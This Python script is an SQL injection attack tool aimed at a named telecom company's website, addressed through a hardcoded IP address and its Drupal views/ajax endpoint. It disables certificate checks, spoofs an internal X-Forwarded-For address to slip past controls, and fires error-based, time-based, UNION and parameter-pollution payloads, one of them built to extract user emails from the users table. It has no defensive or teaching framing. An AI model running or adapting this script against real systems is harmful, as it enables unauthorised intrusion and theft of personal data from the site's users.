import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
TARGET_IP = "43.255.196.45"
HOST = "www.telkomsel.com"
BYPASS_HEADER = {"Host": HOST, "X-Forwarded-For": "10.49.8.173", "User-Agent": "Astro/GodMode"}
URL = f"https://{TARGET_IP}/views/ajax"

def inject_sqli():
    print(f"[*] Initiating God-Level SQL Injection on {HOST}...")
    
    # Payloads: Error-Based and Time-Based
    payloads = [
        # 1. Classic Error Based (Drupal specific syntax sometimes leaks PDO errors)
        {"view_name": "showcase_hub_widget", "view_display_id": "block_1", "view_args": "1' OR 1=1 -- "},
        
        # 2. Time-Based Blind (MySQL) - Sleep 5 seconds
        {"view_name": "showcase_hub_widget", "view_display_id": "block_1", "view_args": "1' AND SLEEP(5) -- "},
        
        # 3. Union Based (Advanced) - Attempt to extract user emails
        {"view_name": "showcase_hub_widget", "view_display_id": "block_1", "view_args": "1' UNION SELECT 1,2,3,mail,5 FROM users_field_data LIMIT 1 -- "},
        
        # 4. HPP (HTTP Parameter Pollution) to confuse parser
        {"view_name": "showcase_hub_widget", "view_display_id": "block_1", "view_args[]": "1' OR '1'='1"}
    ]

    for i, data in enumerate(payloads):
        print(f"[*] Testing Payload #{i+1}...")
        try:
            start_time = time.time()
            r = requests.post(URL, data=data, headers=BYPASS_HEADER, verify=False, timeout=10)
            duration = time.time() - start_time
            
            # Analysis
            if duration > 4.5 and "SLEEP" in data.get('view_args', ''):
                print(f"[!!!] CRITICAL: TIME-BASED SQLi CONFIRMED! (Response Time: {duration:.2f}s)")
                return True
                
            if "SQL syntax" in r.text or "PDOException" in r.text:
                print(f"[!] POTENTIAL ERROR-BASED SQLi DETECTED!")
                print(f"    Error Preview: {r.text[:100]}")
            
            # Check for data leak (Email pattern)
            if "@" in r.text and "UNION" in data.get('view_args', ''):
                 print(f"[!] POTENTIAL DATA LEAK DETECTED!")
                 
        except requests.exceptions.ReadTimeout:
             print("[-] Timeout (Could be Time-Based SQLi success)")
        except Exception as e:
            print(f"[-] Error: {e}")

    print("[*] Injection tests completed.")
    return False

if __name__ == "__main__":
    inject_sqli()
